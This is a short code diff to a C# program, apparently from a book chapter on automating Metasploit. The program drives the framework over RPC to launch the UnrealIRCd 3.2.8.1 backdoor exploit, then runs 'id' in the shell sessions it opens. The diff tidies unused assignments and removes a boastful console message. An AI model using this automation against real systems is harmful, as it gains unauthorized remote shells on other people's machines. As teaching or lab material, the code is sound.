@@ -33,7 +33,7 @@ namespace ch13_automating_metasploit
 					opts ["LPORT"] = listenPort;
 					opts ["PAYLOAD"] = payload;
 
-					response = manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
+					manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
 
 					response = manager.ListJobs ();
 					List<object> vals = new List<object> (response.Values);
@@ -44,16 +44,14 @@ namespace ch13_automating_metasploit
 						vals = new List<object> (response.Values);
 					}
 
-					response = manager.StopJob (jobID.ToString ());
+					manager.StopJob (jobID.ToString ());
+
 					response = manager.ListSessions ();
-
-					Console.WriteLine ("I popped " + response.Count + " shells. Awesome.");
-
 					foreach (var pair in response) {
 						string id = pair.Key;
 						Dictionary<string, object> dict = (Dictionary<string, object>)pair.Value;
 						if ((dict ["type"] as string) == "shell") {
-							response = manager.WriteToSessionShell (id, "id\n");
+							manager.WriteToSessionShell (id, "id\n");
 							System.Threading.Thread.Sleep (6000);
 							response = manager.ReadSessionShell (id);
 
